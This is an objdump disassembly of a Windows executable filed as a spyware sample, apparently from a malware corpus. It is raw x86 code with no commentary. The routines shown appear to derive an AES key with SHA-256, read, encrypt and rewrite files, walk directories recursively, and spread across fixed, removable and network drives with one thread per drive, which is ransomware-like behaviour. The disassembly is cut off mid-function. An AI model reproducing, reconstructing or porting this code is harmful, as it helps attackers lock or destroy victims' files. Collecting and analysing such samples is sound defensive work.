
malware_samples/spyware/7f3bfd0cc61218f8b5bff0850eb3cc9d5eadd7e735f9c0faf1224972c99e253b.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	81 ec 04 08 00 00    	sub    $0x804,%esp
  401006:	56                   	push   %esi
  401007:	68 b8 31 40 00       	push   $0x4031b8
  40100c:	50                   	push   %eax
  40100d:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  401011:	68 d4 32 40 00       	push   $0x4032d4
  401016:	51                   	push   %ecx
  401017:	ff 15 44 31 40 00    	call   *0x403144
  40101d:	83 c4 10             	add    $0x10,%esp
  401020:	6a 00                	push   $0x0
  401022:	6a 00                	push   $0x0
  401024:	6a 01                	push   $0x1
  401026:	6a 00                	push   $0x0
  401028:	6a 02                	push   $0x2
  40102a:	68 00 00 00 40       	push   $0x40000000
  40102f:	8d 54 24 20          	lea    0x20(%esp),%edx
  401033:	52                   	push   %edx
  401034:	ff 15 d8 30 40 00    	call   *0x4030d8
  40103a:	8b f0                	mov    %eax,%esi
  40103c:	83 fe ff             	cmp    $0xffffffff,%esi
  40103f:	74 28                	je     0x401069
  401041:	6a 00                	push   $0x0
  401043:	8d 44 24 08          	lea    0x8(%esp),%eax
  401047:	50                   	push   %eax
  401048:	68 a0 56 40 00       	push   $0x4056a0
  40104d:	ff 15 e8 30 40 00    	call   *0x4030e8
  401053:	03 c0                	add    %eax,%eax
  401055:	50                   	push   %eax
  401056:	68 a0 56 40 00       	push   $0x4056a0
  40105b:	56                   	push   %esi
  40105c:	ff 15 b0 30 40 00    	call   *0x4030b0
  401062:	56                   	push   %esi
  401063:	ff 15 60 30 40 00    	call   *0x403060
  401069:	5e                   	pop    %esi
  40106a:	81 c4 04 08 00 00    	add    $0x804,%esp
  401070:	c3                   	ret
  401071:	cc                   	int3
  401072:	cc                   	int3
  401073:	cc                   	int3
  401074:	cc                   	int3
  401075:	cc                   	int3
  401076:	cc                   	int3
  401077:	cc                   	int3
  401078:	cc                   	int3
  401079:	cc                   	int3
  40107a:	cc                   	int3
  40107b:	cc                   	int3
  40107c:	cc                   	int3
  40107d:	cc                   	int3
  40107e:	cc                   	int3
  40107f:	cc                   	int3
  401080:	83 ec 30             	sub    $0x30,%esp
  401083:	53                   	push   %ebx
  401084:	55                   	push   %ebp
  401085:	8b 6c 24 3c          	mov    0x3c(%esp),%ebp
  401089:	56                   	push   %esi
  40108a:	57                   	push   %edi
  40108b:	33 ff                	xor    %edi,%edi
  40108d:	57                   	push   %edi
  40108e:	57                   	push   %edi
  40108f:	6a 03                	push   $0x3
  401091:	57                   	push   %edi
  401092:	6a 07                	push   $0x7
  401094:	68 00 00 00 c0       	push   $0xc0000000
  401099:	33 db                	xor    %ebx,%ebx
  40109b:	55                   	push   %ebp
  40109c:	89 5c 24 40          	mov    %ebx,0x40(%esp)
  4010a0:	89 7c 24 34          	mov    %edi,0x34(%esp)
  4010a4:	89 7c 24 30          	mov    %edi,0x30(%esp)
  4010a8:	ff 15 d8 30 40 00    	call   *0x4030d8
  4010ae:	8b f0                	mov    %eax,%esi
  4010b0:	83 fe ff             	cmp    $0xffffffff,%esi
  4010b3:	0f 84 f1 01 00 00    	je     0x4012aa
  4010b9:	8d 44 24 28          	lea    0x28(%esp),%eax
  4010bd:	50                   	push   %eax
  4010be:	8d 4c 24 34          	lea    0x34(%esp),%ecx
  4010c2:	51                   	push   %ecx
  4010c3:	8d 54 24 40          	lea    0x40(%esp),%edx
  4010c7:	52                   	push   %edx
  4010c8:	56                   	push   %esi
  4010c9:	ff 15 20 31 40 00    	call   *0x403120
  4010cf:	68 00 00 00 f0       	push   $0xf0000000
  4010d4:	6a 18                	push   $0x18
  4010d6:	68 e0 32 40 00       	push   $0x4032e0
  4010db:	57                   	push   %edi
  4010dc:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  4010e0:	50                   	push   %eax
  4010e1:	ff 15 10 30 40 00    	call   *0x403010
  4010e7:	83 f8 01             	cmp    $0x1,%eax
  4010ea:	0f 85 b3 01 00 00    	jne    0x4012a3
  4010f0:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  4010f4:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  4010f8:	51                   	push   %ecx
  4010f9:	57                   	push   %edi
  4010fa:	57                   	push   %edi
  4010fb:	68 0c 80 00 00       	push   $0x800c
  401100:	52                   	push   %edx
  401101:	ff 15 28 30 40 00    	call   *0x403028
  401107:	83 f8 01             	cmp    $0x1,%eax
  40110a:	0f 85 87 01 00 00    	jne    0x401297
  401110:	57                   	push   %edi
  401111:	68 80 54 40 00       	push   $0x405480
  401116:	ff 15 e8 30 40 00    	call   *0x4030e8
  40111c:	03 c0                	add    %eax,%eax
  40111e:	50                   	push   %eax
  40111f:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  401123:	68 80 54 40 00       	push   $0x405480
  401128:	50                   	push   %eax
  401129:	ff 15 04 30 40 00    	call   *0x403004
  40112f:	83 f8 01             	cmp    $0x1,%eax
  401132:	0f 85 50 01 00 00    	jne    0x401288
  401138:	8b 54 24 14          	mov    0x14(%esp),%edx
  40113c:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  401140:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  401144:	51                   	push   %ecx
  401145:	6a 05                	push   $0x5
  401147:	52                   	push   %edx
  401148:	68 10 66 00 00       	push   $0x6610
  40114d:	50                   	push   %eax
  40114e:	ff 15 14 30 40 00    	call   *0x403014
  401154:	83 f8 01             	cmp    $0x1,%eax
  401157:	0f 85 2b 01 00 00    	jne    0x401288
  40115d:	57                   	push   %edi
  40115e:	56                   	push   %esi
  40115f:	ff 15 6c 30 40 00    	call   *0x40306c
  401165:	8b 54 24 18          	mov    0x18(%esp),%edx
  401169:	57                   	push   %edi
  40116a:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  40116e:	51                   	push   %ecx
  40116f:	57                   	push   %edi
  401170:	57                   	push   %edi
  401171:	6a 01                	push   $0x1
  401173:	57                   	push   %edi
  401174:	52                   	push   %edx
  401175:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  401179:	ff 15 24 30 40 00    	call   *0x403024
  40117f:	8b 44 24 10          	mov    0x10(%esp),%eax
  401183:	6a 04                	push   $0x4
  401185:	68 00 30 00 00       	push   $0x3000
  40118a:	50                   	push   %eax
  40118b:	57                   	push   %edi
  40118c:	8b 3d f4 30 40 00    	mov    0x4030f4,%edi
  401192:	ff d7                	call   *%edi
  401194:	8b 54 24 10          	mov    0x10(%esp),%edx
  401198:	6a 00                	push   $0x0
  40119a:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  40119e:	51                   	push   %ecx
  40119f:	52                   	push   %edx
  4011a0:	8b d8                	mov    %eax,%ebx
  4011a2:	53                   	push   %ebx
  4011a3:	56                   	push   %esi
  4011a4:	ff 15 44 30 40 00    	call   *0x403044
  4011aa:	83 f8 01             	cmp    $0x1,%eax
  4011ad:	0f 85 b6 00 00 00    	jne    0x401269
  4011b3:	8b 44 24 10          	mov    0x10(%esp),%eax
  4011b7:	8b 54 24 18          	mov    0x18(%esp),%edx
  4011bb:	50                   	push   %eax
  4011bc:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  4011c0:	51                   	push   %ecx
  4011c1:	53                   	push   %ebx
  4011c2:	6a 00                	push   $0x0
  4011c4:	6a 01                	push   $0x1
  4011c6:	6a 00                	push   $0x0
  4011c8:	52                   	push   %edx
  4011c9:	ff 15 24 30 40 00    	call   *0x403024
  4011cf:	83 f8 01             	cmp    $0x1,%eax
  4011d2:	0f 85 91 00 00 00    	jne    0x401269
  4011d8:	56                   	push   %esi
  4011d9:	ff 15 88 30 40 00    	call   *0x403088
  4011df:	6a 00                	push   $0x0
  4011e1:	6a 00                	push   $0x0
  4011e3:	6a 00                	push   $0x0
  4011e5:	56                   	push   %esi
  4011e6:	ff 15 78 30 40 00    	call   *0x403078
  4011ec:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4011f0:	6a 00                	push   $0x0
  4011f2:	8d 44 24 24          	lea    0x24(%esp),%eax
  4011f6:	50                   	push   %eax
  4011f7:	51                   	push   %ecx
  4011f8:	53                   	push   %ebx
  4011f9:	56                   	push   %esi
  4011fa:	ff 15 b0 30 40 00    	call   *0x4030b0
  401200:	83 f8 01             	cmp    $0x1,%eax
  401203:	75 64                	jne    0x401269
  401205:	8d 54 24 28          	lea    0x28(%esp),%edx
  401209:	52                   	push   %edx
  40120a:	8d 44 24 34          	lea    0x34(%esp),%eax
  40120e:	50                   	push   %eax
  40120f:	8d 4c 24 40          	lea    0x40(%esp),%ecx
  401213:	51                   	push   %ecx
  401214:	56                   	push   %esi
  401215:	ff 15 ac 30 40 00    	call   *0x4030ac
  40121b:	56                   	push   %esi
  40121c:	ff 15 60 30 40 00    	call   *0x403060
  401222:	6a 04                	push   $0x4
  401224:	68 00 10 00 00       	push   $0x1000
  401229:	68 00 04 00 00       	push   $0x400
  40122e:	6a 00                	push   $0x0
  401230:	ff d7                	call   *%edi
  401232:	55                   	push   %ebp
  401233:	8b f8                	mov    %eax,%edi
  401235:	68 4c 33 40 00       	push   $0x40334c
  40123a:	57                   	push   %edi
  40123b:	ff 15 44 31 40 00    	call   *0x403144
  401241:	83 c4 0c             	add    $0xc,%esp
  401244:	57                   	push   %edi
  401245:	55                   	push   %ebp
  401246:	ff 15 fc 30 40 00    	call   *0x4030fc
  40124c:	68 00 80 00 00       	push   $0x8000
  401251:	6a 00                	push   $0x0
  401253:	57                   	push   %edi
  401254:	ff 15 a8 30 40 00    	call   *0x4030a8
  40125a:	8b c5                	mov    %ebp,%eax
  40125c:	c7 44 24 24 01 00 00 	movl   $0x1,0x24(%esp)
  401263:	00 
  401264:	e8 97 fd ff ff       	call   0x401000
  401269:	68 00 80 00 00       	push   $0x8000
  40126e:	6a 00                	push   $0x0
  401270:	53                   	push   %ebx
  401271:	ff 15 a8 30 40 00    	call   *0x4030a8
  401277:	8b 54 24 18          	mov    0x18(%esp),%edx
  40127b:	52                   	push   %edx
  40127c:	ff 15 2c 30 40 00    	call   *0x40302c
  401282:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  401286:	33 ff                	xor    %edi,%edi
  401288:	8b 44 24 14          	mov    0x14(%esp),%eax
  40128c:	50                   	push   %eax
  40128d:	ff 15 30 30 40 00    	call   *0x403030
  401293:	89 7c 24 14          	mov    %edi,0x14(%esp)
  401297:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  40129b:	57                   	push   %edi
  40129c:	51                   	push   %ecx
  40129d:	ff 15 1c 30 40 00    	call   *0x40301c
  4012a3:	56                   	push   %esi
  4012a4:	ff 15 60 30 40 00    	call   *0x403060
  4012aa:	5f                   	pop    %edi
  4012ab:	5e                   	pop    %esi
  4012ac:	5d                   	pop    %ebp
  4012ad:	8b c3                	mov    %ebx,%eax
  4012af:	5b                   	pop    %ebx
  4012b0:	83 c4 30             	add    $0x30,%esp
  4012b3:	c3                   	ret
  4012b4:	cc                   	int3
  4012b5:	cc                   	int3
  4012b6:	cc                   	int3
  4012b7:	cc                   	int3
  4012b8:	cc                   	int3
  4012b9:	cc                   	int3
  4012ba:	cc                   	int3
  4012bb:	cc                   	int3
  4012bc:	cc                   	int3
  4012bd:	cc                   	int3
  4012be:	cc                   	int3
  4012bf:	cc                   	int3
  4012c0:	55                   	push   %ebp
  4012c1:	8b ec                	mov    %esp,%ebp
  4012c3:	83 e4 f8             	and    $0xfffffff8,%esp
  4012c6:	81 ec 5c 0a 00 00    	sub    $0xa5c,%esp
  4012cc:	53                   	push   %ebx
  4012cd:	56                   	push   %esi
  4012ce:	8b 75 08             	mov    0x8(%ebp),%esi
  4012d1:	57                   	push   %edi
  4012d2:	56                   	push   %esi
  4012d3:	ff 15 e8 30 40 00    	call   *0x4030e8
  4012d9:	8b 3d 44 31 40 00    	mov    0x403144,%edi
  4012df:	33 c9                	xor    %ecx,%ecx
  4012e1:	83 f8 03             	cmp    $0x3,%eax
  4012e4:	0f 94 c1             	sete   %cl
  4012e7:	56                   	push   %esi
  4012e8:	8d 94 24 6c 02 00 00 	lea    0x26c(%esp),%edx
  4012ef:	68 68 33 40 00       	push   $0x403368
  4012f4:	52                   	push   %edx
  4012f5:	89 4c 24 20          	mov    %ecx,0x20(%esp)
  4012f9:	ff d7                	call   *%edi
  4012fb:	83 c4 0c             	add    $0xc,%esp
  4012fe:	8d 44 24 18          	lea    0x18(%esp),%eax
  401302:	50                   	push   %eax
  401303:	8d 8c 24 6c 02 00 00 	lea    0x26c(%esp),%ecx
  40130a:	51                   	push   %ecx
  40130b:	ff 15 74 30 40 00    	call   *0x403074
  401311:	89 44 24 10          	mov    %eax,0x10(%esp)
  401315:	83 f8 ff             	cmp    $0xffffffff,%eax
  401318:	0f 84 64 01 00 00    	je     0x401482
  40131e:	8b 1d 30 31 40 00    	mov    0x403130,%ebx
  401324:	eb 10                	jmp    0x401336
  401326:	eb 08                	jmp    0x401330
  401328:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40132f:	90                   	nop
  401330:	8b 3d 44 31 40 00    	mov    0x403144,%edi
  401336:	83 7c 24 14 00       	cmpl   $0x0,0x14(%esp)
  40133b:	75 15                	jne    0x401352
  40133d:	8d 54 24 44          	lea    0x44(%esp),%edx
  401341:	52                   	push   %edx
  401342:	56                   	push   %esi
  401343:	68 78 33 40 00       	push   $0x403378
  401348:	8d 84 24 74 02 00 00 	lea    0x274(%esp),%eax
  40134f:	50                   	push   %eax
  401350:	eb 13                	jmp    0x401365
  401352:	8d 4c 24 44          	lea    0x44(%esp),%ecx
  401356:	51                   	push   %ecx
  401357:	56                   	push   %esi
  401358:	68 84 33 40 00       	push   $0x403384
  40135d:	8d 94 24 74 02 00 00 	lea    0x274(%esp),%edx
  401364:	52                   	push   %edx
  401365:	ff d7                	call   *%edi
  401367:	83 c4 10             	add    $0x10,%esp
  40136a:	f6 44 24 18 10       	testb  $0x10,0x18(%esp)
  40136f:	74 43                	je     0x4013b4
  401371:	8b 3d e0 30 40 00    	mov    0x4030e0,%edi
  401377:	68 90 33 40 00       	push   $0x403390
  40137c:	8d 44 24 48          	lea    0x48(%esp),%eax
  401380:	50                   	push   %eax
  401381:	ff d7                	call   *%edi
  401383:	85 c0                	test   %eax,%eax
  401385:	0f 84 d4 00 00 00    	je     0x40145f
  40138b:	68 98 33 40 00       	push   $0x403398
  401390:	8d 4c 24 48          	lea    0x48(%esp),%ecx
  401394:	51                   	push   %ecx
  401395:	ff d7                	call   *%edi
  401397:	85 c0                	test   %eax,%eax
  401399:	0f 84 c0 00 00 00    	je     0x40145f
  40139f:	8d 94 24 68 02 00 00 	lea    0x268(%esp),%edx
  4013a6:	52                   	push   %edx
  4013a7:	e8 14 ff ff ff       	call   0x4012c0
  4013ac:	83 c4 04             	add    $0x4,%esp
  4013af:	e9 ab 00 00 00       	jmp    0x40145f
  4013b4:	33 ff                	xor    %edi,%edi
  4013b6:	33 f6                	xor    %esi,%esi
  4013b8:	eb 06                	jmp    0x4013c0
  4013ba:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  4013c0:	8b 86 00 50 40 00    	mov    0x405000(%esi),%eax
  4013c6:	50                   	push   %eax
  4013c7:	8d 8c 24 6c 02 00 00 	lea    0x26c(%esp),%ecx
  4013ce:	51                   	push   %ecx
  4013cf:	ff d3                	call   *%ebx
  4013d1:	85 c0                	test   %eax,%eax
  4013d3:	74 05                	je     0x4013da
  4013d5:	bf 01 00 00 00       	mov    $0x1,%edi
  4013da:	83 c6 04             	add    $0x4,%esi
  4013dd:	83 fe 38             	cmp    $0x38,%esi
  4013e0:	72 de                	jb     0x4013c0
  4013e2:	68 20 5f 40 00       	push   $0x405f20
  4013e7:	8d 94 24 6c 02 00 00 	lea    0x26c(%esp),%edx
  4013ee:	52                   	push   %edx
  4013ef:	ff d3                	call   *%ebx
  4013f1:	85 c0                	test   %eax,%eax
  4013f3:	75 13                	jne    0x401408
  4013f5:	68 9c 33 40 00       	push   $0x40339c
  4013fa:	8d 84 24 6c 02 00 00 	lea    0x26c(%esp),%eax
  401401:	50                   	push   %eax
  401402:	ff d3                	call   *%ebx
  401404:	85 c0                	test   %eax,%eax
  401406:	74 05                	je     0x40140d
  401408:	bf 01 00 00 00       	mov    $0x1,%edi
  40140d:	8b 44 24 18          	mov    0x18(%esp),%eax
  401411:	a8 04                	test   $0x4,%al
  401413:	75 47                	jne    0x40145c
  401415:	a9 00 01 00 00       	test   $0x100,%eax
  40141a:	75 40                	jne    0x40145c
  40141c:	85 ff                	test   %edi,%edi
  40141e:	75 3c                	jne    0x40145c
  401420:	3d 80 00 00 00       	cmp    $0x80,%eax
  401425:	74 13                	je     0x40143a
  401427:	68 80 00 00 00       	push   $0x80
  40142c:	8d 8c 24 6c 02 00 00 	lea    0x26c(%esp),%ecx
  401433:	51                   	push   %ecx
  401434:	ff 15 54 30 40 00    	call   *0x403054
  40143a:	8d 94 24 68 02 00 00 	lea    0x268(%esp),%edx
  401441:	52                   	push   %edx
  401442:	e8 39 fc ff ff       	call   0x401080
  401447:	83 c4 04             	add    $0x4,%esp
  40144a:	85 c0                	test   %eax,%eax
  40144c:	75 0e                	jne    0x40145c
  40144e:	8d 84 24 68 02 00 00 	lea    0x268(%esp),%eax
  401455:	50                   	push   %eax
  401456:	ff 15 5c 30 40 00    	call   *0x40305c
  40145c:	8b 75 08             	mov    0x8(%ebp),%esi
  40145f:	8b 54 24 10          	mov    0x10(%esp),%edx
  401463:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  401467:	51                   	push   %ecx
  401468:	52                   	push   %edx
  401469:	ff 15 d0 30 40 00    	call   *0x4030d0
  40146f:	85 c0                	test   %eax,%eax
  401471:	0f 85 b9 fe ff ff    	jne    0x401330
  401477:	8b 44 24 10          	mov    0x10(%esp),%eax
  40147b:	50                   	push   %eax
  40147c:	ff 15 00 31 40 00    	call   *0x403100
  401482:	5f                   	pop    %edi
  401483:	5e                   	pop    %esi
  401484:	5b                   	pop    %ebx
  401485:	8b e5                	mov    %ebp,%esp
  401487:	5d                   	pop    %ebp
  401488:	c3                   	ret
  401489:	cc                   	int3
  40148a:	cc                   	int3
  40148b:	cc                   	int3
  40148c:	cc                   	int3
  40148d:	cc                   	int3
  40148e:	cc                   	int3
  40148f:	cc                   	int3
  401490:	83 ec 14             	sub    $0x14,%esp
  401493:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401497:	50                   	push   %eax
  401498:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  40149f:	00 
  4014a0:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4014a7:	00 
  4014a8:	ff 15 58 30 40 00    	call   *0x403058
  4014ae:	50                   	push   %eax
  4014af:	ff 15 08 31 40 00    	call   *0x403108
  4014b5:	85 c0                	test   %eax,%eax
  4014b7:	0f 84 a8 00 00 00    	je     0x401565
  4014bd:	53                   	push   %ebx
  4014be:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  4014c2:	51                   	push   %ecx
  4014c3:	8d 54 24 08          	lea    0x8(%esp),%edx
  4014c7:	52                   	push   %edx
  4014c8:	6a 01                	push   $0x1
  4014ca:	6a 00                	push   $0x0
  4014cc:	6a 00                	push   $0x0
  4014ce:	e8 c7 0e 00 00       	call   0x40239a
  4014d3:	33 db                	xor    %ebx,%ebx
  4014d5:	39 5c 24 0c          	cmp    %ebx,0xc(%esp)
  4014d9:	0f 86 7b 00 00 00    	jbe    0x40155a
  4014df:	56                   	push   %esi
  4014e0:	57                   	push   %edi
  4014e1:	33 f6                	xor    %esi,%esi
  4014e3:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4014e7:	8b 0c 06             	mov    (%esi,%eax,1),%ecx
  4014ea:	3b 4c 24 18          	cmp    0x18(%esp),%ecx
  4014ee:	74 5e                	je     0x40154e
  4014f0:	8b f9                	mov    %ecx,%edi
  4014f2:	ff 15 14 31 40 00    	call   *0x403114
  4014f8:	3b f8                	cmp    %eax,%edi
  4014fa:	74 52                	je     0x40154e
  4014fc:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  401500:	52                   	push   %edx
  401501:	8d 44 24 14          	lea    0x14(%esp),%eax
  401505:	50                   	push   %eax
  401506:	6a 08                	push   $0x8
  401508:	57                   	push   %edi
  401509:	6a 00                	push   $0x0
  40150b:	e8 7e 0e 00 00       	call   0x40238e
  401510:	83 f8 01             	cmp    $0x1,%eax
  401513:	75 39                	jne    0x40154e
  401515:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  401519:	66 83 39 04          	cmpw   $0x4,(%ecx)
  40151d:	50                   	push   %eax
  40151e:	75 0a                	jne    0x40152a
  401520:	8b 54 24 10          	mov    0x10(%esp),%edx
  401524:	8b 04 16             	mov    (%esi,%edx,1),%eax
  401527:	50                   	push   %eax
  401528:	eb 1d                	jmp    0x401547
  40152a:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40152e:	8b 14 0e             	mov    (%esi,%ecx,1),%edx
  401531:	52                   	push   %edx
  401532:	6a 00                	push   $0x0
  401534:	e8 67 0e 00 00       	call   0x4023a0
  401539:	83 f8 01             	cmp    $0x1,%eax
  40153c:	75 10                	jne    0x40154e
  40153e:	50                   	push   %eax
  40153f:	8b 44 24 10          	mov    0x10(%esp),%eax
  401543:	8b 0c 06             	mov    (%esi,%eax,1),%ecx
  401546:	51                   	push   %ecx
  401547:	6a 00                	push   $0x0
  401549:	e8 58 0e 00 00       	call   0x4023a6
  40154e:	43                   	inc    %ebx
  40154f:	83 c6 0c             	add    $0xc,%esi
  401552:	3b 5c 24 14          	cmp    0x14(%esp),%ebx
  401556:	72 8b                	jb     0x4014e3
  401558:	5f                   	pop    %edi
  401559:	5e                   	pop    %esi
  40155a:	8b 54 24 04          	mov    0x4(%esp),%edx
  40155e:	52                   	push   %edx
  40155f:	e8 30 0e 00 00       	call   0x402394
  401564:	5b                   	pop    %ebx
  401565:	83 c4 14             	add    $0x14,%esp
  401568:	c3                   	ret
  401569:	cc                   	int3
  40156a:	cc                   	int3
  40156b:	cc                   	int3
  40156c:	cc                   	int3
  40156d:	cc                   	int3
  40156e:	cc                   	int3
  40156f:	cc                   	int3
  401570:	83 ec 14             	sub    $0x14,%esp
  401573:	8d 04 24             	lea    (%esp),%eax
  401576:	68 40 65 40 00       	push   $0x406540
  40157b:	50                   	push   %eax
  40157c:	ff 15 44 31 40 00    	call   *0x403144
  401582:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  401586:	51                   	push   %ecx
  401587:	e8 34 fd ff ff       	call   0x4012c0
  40158c:	83 c4 0c             	add    $0xc,%esp
  40158f:	6a 00                	push   $0x0
  401591:	ff 15 dc 30 40 00    	call   *0x4030dc
  401597:	cc                   	int3
  401598:	cc                   	int3
  401599:	cc                   	int3
  40159a:	cc                   	int3
  40159b:	cc                   	int3
  40159c:	cc                   	int3
  40159d:	cc                   	int3
  40159e:	cc                   	int3
  40159f:	cc                   	int3
  4015a0:	81 ec 18 02 00 00    	sub    $0x218,%esp
  4015a6:	56                   	push   %esi
  4015a7:	e8 e4 fe ff ff       	call   0x401490
  4015ac:	68 ff 00 00 00       	push   $0xff
  4015b1:	68 20 5f 40 00       	push   $0x405f20
  4015b6:	68 c4 33 40 00       	push   $0x4033c4
  4015bb:	ff 15 48 30 40 00    	call   *0x403048
  4015c1:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4015c5:	50                   	push   %eax
  4015c6:	68 00 01 00 00       	push   $0x100
  4015cb:	ff 15 9c 30 40 00    	call   *0x40309c
  4015d1:	66 83 7c 24 1c 00    	cmpw   $0x0,0x1c(%esp)
  4015d7:	8d 74 24 1c          	lea    0x1c(%esp),%esi
  4015db:	0f 84 bf 00 00 00    	je     0x4016a0
  4015e1:	53                   	push   %ebx
  4015e2:	55                   	push   %ebp
  4015e3:	8b 2d 4c 30 40 00    	mov    0x40304c,%ebp
  4015e9:	57                   	push   %edi
  4015ea:	8b 3d 44 31 40 00    	mov    0x403144,%edi
  4015f0:	bb a0 5e 40 00       	mov    $0x405ea0,%ebx
  4015f5:	56                   	push   %esi
  4015f6:	ff 15 84 30 40 00    	call   *0x403084
  4015fc:	83 f8 03             	cmp    $0x3,%eax
  4015ff:	74 18                	je     0x401619
  401601:	56                   	push   %esi
  401602:	ff 15 84 30 40 00    	call   *0x403084
  401608:	83 f8 02             	cmp    $0x2,%eax
  40160b:	74 0c                	je     0x401619
  40160d:	56                   	push   %esi
  40160e:	ff 15 84 30 40 00    	call   *0x403084
  401614:	83 f8 04             	cmp    $0x4,%eax
  401617:	75 6d                	jne    0x401686
  401619:	56                   	push   %esi
  40161a:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  40161e:	68 d8 33 40 00       	push   $0x4033d8
  401623:	51                   	push   %ecx
  401624:	ff d7                	call   *%edi
  401626:	83 c4 0c             	add    $0xc,%esp
  401629:	68 00 01 00 00       	push   $0x100
  40162e:	6a 00                	push   $0x0
  401630:	6a 00                	push   $0x0
  401632:	6a 00                	push   $0x0
  401634:	8d 54 24 20          	lea    0x20(%esp),%edx
  401638:	52                   	push   %edx
  401639:	68 80 00 00 00       	push   $0x80
  40163e:	6a 00                	push   $0x0
  401640:	8d 44 24 30          	lea    0x30(%esp),%eax
  401644:	50                   	push   %eax
  401645:	ff 15 50 30 40 00    	call   *0x403050
  40164b:	83 f8 01             	cmp    $0x1,%eax
  40164e:	75 36                	jne    0x401686
  401650:	83 7c 24 10 00       	cmpl   $0x0,0x10(%esp)
  401655:	74 2f                	je     0x401686
  401657:	56                   	push   %esi
  401658:	68 40 65 40 00       	push   $0x406540
  40165d:	ff d7                	call   *%edi
  40165f:	83 c4 08             	add    $0x8,%esp
  401662:	6a 00                	push   $0x0
  401664:	6a 00                	push   $0x0
  401666:	68 40 65 40 00       	push   $0x406540
  40166b:	68 70 15 40 00       	push   $0x401570
  401670:	6a 00                	push   $0x0
  401672:	6a 00                	push   $0x0
  401674:	ff d5                	call   *%ebp
  401676:	89 03                	mov    %eax,(%ebx)
  401678:	68 f4 01 00 00       	push   $0x1f4
  40167d:	83 c3 04             	add    $0x4,%ebx
  401680:	ff 15 bc 30 40 00    	call   *0x4030bc
  401686:	56                   	push   %esi
  401687:	ff 15 e8 30 40 00    	call   *0x4030e8
  40168d:	66 83 7c 46 02 00    	cmpw   $0x0,0x2(%esi,%eax,2)
  401693:	8d 74 46 02          	lea    0x2(%esi,%eax,2),%esi
  401697:	0f 85 58 ff ff ff    	jne    0x4015f5
  40169d:	5f                   	pop    %edi
  40169e:	5d                   	pop    %ebp
  40169f:	5b                   	pop    %ebx
  4016a0:	6a ff                	push   $0xffffffff
  4016a2:	ff 15 bc 30 40 00    	call   *0x4030bc
  4016a8:	5e                   	pop    %esi
  4016a9:	81 c4 18 02 00 00    	add    $0x218,%esp
  4016af:	c3                   	ret
  4016b0:	53                   	push   %ebx
  4016b1:	56                   	push   %esi
  4016b2:	57                   	push   %edi
  4016b3:	6a 02                	push   $0x2
  4016b5:	68 00 04 00 00       	push   $0x400
  4016ba:	6a 00                	push   $0x0
  4016bc:	ff 15 8c 30 40 00    	call   *0x40308c
  4016c2:	8b f0                	mov    %eax,%esi
  4016c4:	56                   	push   %esi
  4016c5:	6a 00                	push   $0x0
  4016c7:	ff 15 90 30 40 00    	call   *0x403090
  4016cd:	56                   	push   %esi
  4016ce:	6a 00                	push   $0x0
  4016d0:	8b f8                	mov    %eax,%edi
  4016d2:	ff 15 c4 30 40 00    	call   *0x4030c4
  4016d8:	57                   	push   %edi
  4016d9:	ff 15 0c 31 40 00    	call   *0x40310c
  4016df:	8b 1d 80 30 40 00    	mov    0x403080,%ebx
  4016e5:	8b f0                	mov    %eax,%esi
  4016e7:	56                   	push   %esi
  4016e8:	ff d3                	call   *%ebx
  4016ea:	50                   	push   %eax
  4016eb:	68 a0 56 40 00       	push   $0x4056a0
  4016f0:	56                   	push   %esi
  4016f1:	ff d3                	call   *%ebx
  4016f3:	50                   	push   %eax
  4016f4:	56                   	push   %esi
  4016f5:	6a 00                	push   $0x0
  4016f7:	6a 00                	push   $0x0
  4016f9:	ff 15 e4 30 40 00    	call   *0x4030e4
  4016ff:	57                   	push   %edi
  401700:	ff 15 7c 30 40 00    	call   *0x40307c
  401706:	5f                   	pop    %edi
  401707:	5e                   	pop    %esi
  401708:	5b                   	pop    %ebx
  401709:	c3                   	ret
  40170a:	cc                   	int3
  40170b:	cc                   	int3
  40170c:	cc                   	int3
  40170d:	cc                   	int3
  40170e:	cc                   	int3
  40170f:	cc                   	int3
  401710:	81 ec 20 02 00 00    	sub    $0x220,%esp
  401716:	53                   	push   %ebx
  401717:	56                   	push   %esi
  401718:	57                   	push   %edi
  401719:	68 ff 00 00 00       	push   $0xff
  40171e:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  401722:	50                   	push   %eax
  401723:	68 e0 33 40 00       	push   $0x4033e0
  401728:	ff 15 48 30 40 00    	call   *0x403048
  40172e:	8b 35 d8 30 40 00    	mov    0x4030d8,%esi
  401734:	6a 00                	push   $0x0
  401736:	68 80 00 00 00       	push   $0x80
  40173b:	6a 03                	push   $0x3
  40173d:	6a 00                	push   $0x0
  40173f:	6a 01                	push   $0x1
  401741:	68 00 00 00 80       	push   $0x80000000
  401746:	8d 4c 24 40          	lea    0x40(%esp),%ecx
  40174a:	51                   	push   %ecx
  40174b:	ff d6                	call   *%esi
  40174d:	8b f8                	mov    %eax,%edi
  40174f:	85 ff                	test   %edi,%edi
  401751:	74 5b                	je     0x4017ae
  401753:	8d 54 24 20          	lea    0x20(%esp),%edx
  401757:	52                   	push   %edx
